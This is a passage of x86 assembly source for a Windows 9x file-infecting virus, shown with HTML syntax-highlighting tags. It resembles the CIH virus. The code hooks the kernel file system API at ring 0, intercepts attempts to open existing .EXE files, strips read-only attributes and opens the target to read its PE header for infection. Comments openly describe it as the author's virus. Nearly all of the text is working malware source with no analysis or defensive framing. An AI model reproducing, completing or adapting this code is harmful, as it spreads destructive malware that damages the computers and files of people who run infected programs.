</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Allocate SystemMemory Page to Use *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">AllocateSystemMemoryPage</span><span class="sc4">:</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; Set the Mark of My Virus Exist in System</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000fh</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0ffffffffh</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000000001h</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000000002h</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">     </span><span class="sc1">; VMMCALL _PageAllocate</span><span class="sc0">
</span><span class="sc5">_PageAllocate</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00010053h</span><span class="sc0">   </span><span class="sc1">; Use EAX, ECX, EDX, and flags</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc0">
 
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; EDI = SystemMemory Start Address</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MyVirusStart</span><span class="sc4">-</span><span class="sc5">@2</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">iretd</span><span class="sc0">   </span><span class="sc1">; Return to Ring3 Initial Program</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Install My File System Api Hook   *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">InstallMyFileSystemApiHook</span><span class="sc4">:</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@6</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">  </span><span class="sc1">; VXDCALL IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
</span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00400067h</span><span class="sc0">   </span><span class="sc1">; Use EAX, ECX, EDX, and flags</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Save OldFileSystemApiHook Address</span><span class="sc0">
 
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EAX = FileSystemApiHook Address</span><span class="sc0">
 
            </span><span class="sc1">; Save Old IFSMgr_InstallFileSystemApiHook Entry Point</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@2</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">OldInstallFileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@3</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 
            </span><span class="sc1">; Modify IFSMgr_InstallFileSystemApiHook Entry Point</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InstallFileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@3</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
            </span><span class="sc6">cli</span><span class="sc0">
 
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitRing0Init</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *             Code Size of Merge Virus Code Section     *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">CodeSizeOfMergeVirusCodeSection</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *             IFSMgr_InstallFileSystemApiHook           *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">InstallFileSystemApiHook</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
 
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@4</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@4</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; mov ebx, offset FileSystemApiHook</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@4</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">  </span><span class="sc1">; VXDCALL IFSMgr_RemoveFileSystemApiHook</span><span class="sc0">
</span><span class="sc5">IFSMgr_RemoveFileSystemApiHook</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00400068h</span><span class="sc0">   </span><span class="sc1">; Use EAX, ECX, EDX, and flags</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
            </span><span class="sc1">; Call Original IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
            </span><span class="sc1">; to Link Client FileSystemApiHook</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OldInstallFileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@3</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
 
            </span><span class="sc1">; Call Original IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
            </span><span class="sc1">; to Link My FileSystemApiHook</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OldInstallFileSystemApiHook</span><span class="sc4">-</span><span class="sc5">@3</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Adjust OldFileSystemApiHook Address</span><span class="sc0">
 
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 
            </span><span class="sc6">ret</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *         Static Data                       *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">OldInstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *             IFSMgr_FileSystemHook                     *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * IFSMgr_FileSystemHook Entry Point *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">FileSystemApiHook</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@3</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">FileSystemApiHook</span><span class="sc0">
 
            </span><span class="sc6">pushad</span><span class="sc0">
 
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@5</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@5</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; mov esi, offset VirusGameDataStartAddress</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusGameDataStartAddress</span><span class="sc4">-</span><span class="sc5">@5</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Is OnBusy !?                      *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">OnBusy</span><span class="sc4">-</span><span class="sc5">@6</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; if ( OnBusy )</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pIFSFunc</span><span class="sc0">            </span><span class="sc1">; goto pIFSFunc</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Is OpenFile !?                    *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc1">; if ( NotOpenFile )</span><span class="sc0">
            </span><span class="sc1">; goto prevhook</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000024h</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">prevhook</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Enable OnBusy                     *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">OnBusy</span><span class="sc4">-</span><span class="sc5">@6</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Enable OnBusy</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Get FilePath's DriveNumber,       *</span><span class="sc0">
</span><span class="sc1">; * then Set the DriveName to         *</span><span class="sc0">
</span><span class="sc1">; * FileNameBuffer.                   *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Ex. If DriveNumber is 03h,        *</span><span class="sc0">
</span><span class="sc1">; *     DriveName is 'C:'.            *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc1">; mov esi, offset FileNameBuffer</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileNameBuffer</span><span class="sc4">-</span><span class="sc5">@6</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CallUniToBCSPath</span><span class="sc0">
 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * UniToBCSPath                      *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * This Service Converts             *</span><span class="sc0">
</span><span class="sc1">; * a Canonicalized Unicode Pathname  *</span><span class="sc0">
</span><span class="sc1">; * to a Normal Pathname in the       *</span><span class="sc0">
</span><span class="sc1">; * Specified BCS Character Set.      *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">CallUniToBCSPath</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FileNameBufferSize</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; VXDCall UniToBCSPath</span><span class="sc0">
</span><span class="sc5">UniToBCSPath</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00400041h</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Is FileName '.EXE' !?             *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc1">; cmp [esi+eax-04h], '.EXE'</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DisableOnBusy</span><span class="sc0">
 
</span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Only for Debug                    *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc1">; cmp [esi+eax-06h], 'FUCK'</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'KCUF'</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DisableOnBusy</span><span class="sc0">
 
</span><span class="sc9">ENDIF</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Is Open Existing File !?          *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc1">; if ( NotOpenExistingFile )</span><span class="sc0">
            </span><span class="sc1">; goto DisableOnBusy</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DisableOnBusy</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Get Attributes of the File        *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
</span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00400032h</span><span class="sc0">
 
            </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">DisableOnBusy</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Get IFSMgr_Ring0_FileIO Address   *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc4">-</span><span class="sc5">@7</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Is Read-Only File !?              *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">OpenFile</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Modify Read-Only File to Write    *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Open File                         *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">OpenFile</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d5h</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
 
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; mov ebx, FileHandle</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Need to Restore                   *</span><span class="sc0">
</span><span class="sc1">; * Attributes of the File !?         *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 
            </span><span class="sc6">pushf</span><span class="sc0">
 
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">IsOpenFileOK</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Restore Attributes of the File    *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Is Open File OK !?                *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">IsOpenFileOK</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">
 
            </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">DisableOnBusy</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Open File Already Succeed.   ^__^ *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; Push FileNameBuffer Address to Stack</span><span class="sc0">
 
            </span><span class="sc6">pushf</span><span class="sc0">       </span><span class="sc1">; Now CF = 0, Push Flag to Stack</span><span class="sc0">
 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DataBuffer</span><span class="sc4">-</span><span class="sc5">@7</span><span class="sc0"> </span><span class="sc1">; mov esi, offset DataBuffer</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Get OffsetToNewHeader   *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d6h</span><span class="sc0">
 
            </span><span class="sc1">; For Doing Minimal VirusCode's Length,</span><span class="sc0">
            </span><span class="sc1">; I Save EAX to EBP.</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc0">
